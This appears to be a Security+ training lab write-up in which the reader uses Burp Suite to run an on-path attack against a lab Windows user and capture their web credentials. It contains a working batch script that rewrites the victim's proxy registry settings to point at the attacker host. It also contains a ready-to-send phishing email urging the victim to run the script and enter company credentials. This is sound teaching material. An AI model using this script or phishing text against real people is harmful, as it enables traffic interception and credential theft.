# Assisted Lab: Understanding On-Path Attacks

## Objective

This activity is designed to test your understanding of and ability to apply content examples in the following CompTIA Security+ objectives:

2.2 Explain common threat vectors and attack surfaces.
2.4 Given a scenario, analyze indicators of malicious activity.
5.6 Given a scenario, implement security awareness practices.

### Skills Learned
[Bullet Points - Remove this afterwards]

- Advanced understanding of SIEM concepts and practical application.
- Proficiency in analyzing and interpreting network logs.
- Ability to generate and recognize attack signatures and patterns.
- Enhanced knowledge of network protocols and security vulnerabilities.
- Development of critical thinking and problem-solving skills in cybersecurity.

### Tools Used
[Bullet Points - Remove this afterwards]

- Burp Suite
- Terminal Emulator

## Steps

### Perform an on-path attack to intercept credentials

In this exercise, you will perform an on-path attack or adversary-in-the-middle (AitM) attack to intercept web communications. The goal is to determine if web credentials can be stolen via a social engineering attack. This will reveal whether insecure protocols are in use in the network and if users are vulnerable to this form of social engineering (i.e., a phishing scam).

1. Connect to the KALI and, if needed, sign in as root using Pa$$w0rd as the password.

2. Burp Suite needs to be configured to perform Proxy without intercept. Start by selecting the Kali Applications menu from the top taskbar. It is to the far left and is a stylized white dragon on a blue square.

3. Select the search field (it will be empty and be indicated by a white magnifying glass), type burp, then select burpsuite.

4. After about 10 seconds, a Burp Suite Community Edition pop-up window is displayed. It contains Terms and Conditions, select I Accept.

5. Another Burp Suite Community Edition pop-up window is displayed which welcomes you to the Burp Suite Community Edition. Select Temporary project, then select Next.

6. On the Select the configuration that you would like to load for this project page, select Use Burp defaults, then select Start Burp.

        - If another pop-up warning window appears stating that Burp Suite is out of date, select OK.

7. The main Burp Suite window is displayed. The default Learn, explore, and discover page is shown.

        - The Burp Suite is capable of many more functions, attacks, exploits, and escapades than just attacker-in-the-middle (AitM) and proxy features. You can read up on the other capabilities of the Burp Suite on the Learn, explore, and discover page.

8. Select the Proxy tab in the Burp Suite window.

9. On the Proxy tab, select the Options sub-tab.

10. In the top section, under the heading Proxy Listeners, select Add.

11. On the Add a new proxy listener window, enter 8080 in the Bind to port: field.

12. Select Specific address, then select 10.1.16.66 in the pull-down list, then select OK.

        - 10.1.16.66 is the IP address of the Kali VM.

13. Select the Intercept sub-tab of the Proxy tab.

14. Confirm that the middle button near the top of the sub-tab is showing Intercept is off

        - If the middle button shows Intercept is on, then select it to switch it to Intercept is off.

15. Select the HTTP history sub-tab of the Proxy tab.

        - This sub-tab is where the web communications proxied by Burp Suite will be visible.

Next, you need to prepare an attack script and social engineering attack to trick the victim into using your Kali system as their proxy.

16. Open a new Terminal window by selecting the Terminal Emulator from the Kali Linux toolbar.

17. Maximize the Terminal window.

18. Enter vim /var/www/html/newproxy.bat

        - This command will open VIM and create a new file named newproxy.bat. This new file is saved in the /var/www/html directory, which is the web root for the local Apache web server.

19. Type i to enter insert mode. The message -- INSERT -- should be present at the bottom of the screen.

20. Type the following into the empty document area of VIM:

        @echo off
        PowerShell Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\'Internet Settings' -Name ProxyServer -Value 10.1.16.66:8080
        PowerShell Set-ItemProperty -Path HKCU:\SOFTWARE\Microsoft\Windows\CurrentVersion\'Internet Settings' -Name ProxyEnable -Value 1

        Be sure to create a final blank line.

        - Double-check that you typed in everything correctly before proceeding.

21. Once finished, press ESC to exit insert mode.

        - Pressing ESC may cause your browser to exit full-screen mode. If that occurs, press ESC a second time to exit VIM's insert mode. Then you can re-enable full-screen mode from the Display lab interface menu.

22. Enter :wq to save and quit VIM.

23. Enter service apache2 start

        This command starts the preexisting Apache2 installation within Kali.

        - If the    Score    task above indicates that your script is incorrect, repeat the vim command to edit and correct any typos, then re-run the    Score    check of your file.

24. Minimize the Terminal window.

At this point, you are ready to exploit the victim. The scenario is that you, as the attacker, send the jaime@structureality.com account the following email message:

    Dear 515Support customer,

    Due to recent equipment changes, there is a need to alter the configuration of your system's proxy settings. Please follow the link below to access an auto-configuration script that will download and apply the necessary changes to your system.

    http://10.1.16.66/newproxy.bat

    Once you have downloaded this file, execute it. Your system may warn you that this is an unknown program. Don't worry about that. Just agree to allow it to run it anyway. Our in-house security team wrote this tool, and it is safe to run. 

    Once the change is made, you are invited to visit the local Juice Shop, where you will receive a free juice on us. We have already set up the discount code by creating an account with your username and password. So, visit http://juiceshop.local, then log in with your company credentials to obtain your free juice!

    Sincerely,
    515Support
        - This exercise assumes the social engineering phishing message has been sent to the victim.

You will temporarily play the part of the victim.

25. Select the MS10 VM. Send Ctrl+Alt+Delete and sign in as Jaime using Pa$$w0rd as the password.

26. Minimize or close Server Manager if it appears. It will not be used in this lab.

27. Open Firefox.

        - You can double-click the Firefox icon on the Desktop or use the Search Windows function.

28. In the Firefox address bar, enter http://10.1.16.66/newproxy.bat

        - This task simulates the victim clicking on the link in the phishing message.

29. The Firefox Downloads window should open and display the download progress.

30. Select newproxy.bat from the Downloads window.

        - If the Firefox Downloads window closes, select the Display the progress of ongoing downloads button from the toolbar. This button looks like an arrow pointing down into an open-top box.

31. A pop-up window appears asking whether to open the file. Select OK.

32. An Open File - Security Warning pop-up window appears. Select Run.

        - The malicious configuration script will execute. The victim's proxy settings are now changed to use the attacker's computer (i.e., Kali) as its' proxy server.

33. Close Firefox.

        - Closing Firefox only to restart it again ensures that the proxy configuration changes take effect.

34. Now you want to claim your free juice! Start Firefox again, and then in the address bar, enter juiceshop.local.

        - This simulates the victim clicking on the link from the phishing message.

35. If a Welcome to OWASP Juice Shop pop-up appears, select Dismiss.

36. Select Account in the top-right area of the web page, then select Login.

37. Since the email claimed you have a pre-established account using your company credentials, type jaime@structureality.com in the Email field and type Pa$$w0rd in the Password field, then select Log in.

38. This login attempt will fail. You will see the message Invalid email or password.

        - For some victims, this will clearly indicate a scam or attack. But for others, they will see this as an attempt to steal their free juice and will report the issue to customer service for a resolution. Either way, as the attacker, you might only have a short window of time to use the credentials you just stole.

Now you will return to play the attacker's part and collect the credentials that have been intercepted.

39. Switch back to the KALI virtual machine and, if needed, sign in as root using Pa$$w0rd as the password.

40. The Burp Suite interface should still be open to the HTTP history sub-tab.

41. You need to find the last communication from the victim to the Juice Shop host of http://juiceshop.local. Select the MIME type column to sort by that value. If the column looks empty, then select it again. You want the sorting to be inverted so the MIME-type "text" communications are at the top.

        The communication you are looking for should have the following parameters:

        Method: POST
        URL: /rest/user/login
        Params: (checkmark)
        Status: 401
        MIME Type: text
    
        There will be other captured communications besides the victim's visit to the Juice Shop website. So, it may take some effort to locate the specific communication.

        - Because you are using the free community version of Burp Suite, the advanced search function is unavailable.

42. Look at each until you see the one which matches the needed parameters, then select it.

        - In a real-world scenario, you might not fully know the expected parameters, and therefore it may take more effort to locate the important communications. If you license the professional version of Burp Suite, you could use the advanced search function to find the communication by keyword or URL path.

43. The contents of the selected message will be shown in the bottom left pane of Burp Suite. You should see the following at the bottom of the communication:

        "email":"jaime@structureality.com",
    
        "password":"Pa$$w0rd"

You have now phished (i.e., stolen) the victim's credentials using a combined attack integrating social engineering (i.e., phishing) and with the use of an intercept proxy (i.e., adversary-in-the-middle (AitM) (a.k.a. on-path attack)).

This exercise has demonstrated the vulnerability that listening devices can intercept insecure protocols in transit. This exercise uses an AitM approach, but an active sniffing approach may be just as effective. This security vulnerability should be reported, and you should recommend that all insecure protocols be upgraded to their encrypted forms.

#### Check your work

Confirm that you configured Burp Suite to act as a proxy.

Confirm that you crafted an exploit script to change the proxy settings of the target victim.

Confirm that you used a social engineering message to exploit the target and direct them to a retail website.

Confirm that you collected the victim's credentials.
